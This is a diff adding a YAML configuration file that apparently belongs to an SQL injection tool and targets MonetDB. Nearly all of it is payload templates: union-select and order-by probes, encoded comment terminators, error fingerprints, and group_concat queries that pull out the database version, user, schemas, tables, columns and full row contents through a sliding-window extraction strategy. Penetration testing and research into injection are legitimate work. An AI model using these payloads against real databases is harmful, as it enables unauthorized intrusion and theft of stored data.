@@ -1,0 +1,138 @@
+vendor: MonetDB
+# docker run -d -P -p 50000:50000 --name monetdb-r monetdb/monetdb-r-docker
+# jdbc:monetdb://127.0.0.1:50001/db
+# monetdb monetdb
+
+resource:
+ info: |
+    'version()'
+    || '${enclose_value_sql}'
+    || 'database()'
+    || '${enclose_value_sql}'
+    || 'user()'
+    || '${trail_sql}'
+
+ schema:
+  database: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}'
+           || q
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select
+           name r,
+           '0' q
+       from schemas
+       group by r
+       ${limit}
+   ) x
+
+  table: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || r
+           || '${separator_qte_sql}0${enclose_value_sql}'
+           || '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select t.name r
+       from tables t
+       inner join schemas s on t.schema_id = s.id
+       where s.name = '${database}'
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select concat(
+       group_concat(
+           '${enclose_value_sql}'
+           || n
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           || '${separator_cell_sql}'
+       ),
+       '${trail_sql}'
+   ) from (
+       select c.name n
+       from tables t
+       inner join schemas s on t.schema_id = s.id  
+       inner join columns c on t.id = c.table_id
+       where s.name = '${database}'
+       and t.name = '${table}'
+       order by n
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select concat(
+        group_concat(
+            '${enclose_value_sql}'
+            || r
+            || '${separator_qte_sql}'
+            || q
+            || '${enclose_value_sql}'
+            || '${separator_cell_sql}'
+        ),
+        '${trail_sql}'
+    ) from (
+        select
+            ${fields} r,
+            count(*) q
+        from ${database}.${table}
+        group by r
+        ${limit}
+    ) x
+   fields:
+    field: ${field.value}
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           concat(
+               '${lead}',
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               )
+           )
+   )
+  limit: limit 65536 offset ${limit.value}
+  failsafe: 1337${indice}7330%2b1
+  calibrator: repeat('${calibrator_sql}', 65536)
+  limitBoundary: 0
+  # Encoded space mandatory to avoid space cleaning
+  # TODO keep raw space
+  # endingComment: --+-
+  # pentesterlab does not work with --+-, switch to #
+  endingComment: '%23'
+  fingerprint:
+   errorMessage:
+    - monetdb
+   orderByErrorMessage:
+    - relational query without result
+
+ normal:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select 
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+   )
+  orderBy: order by 1337
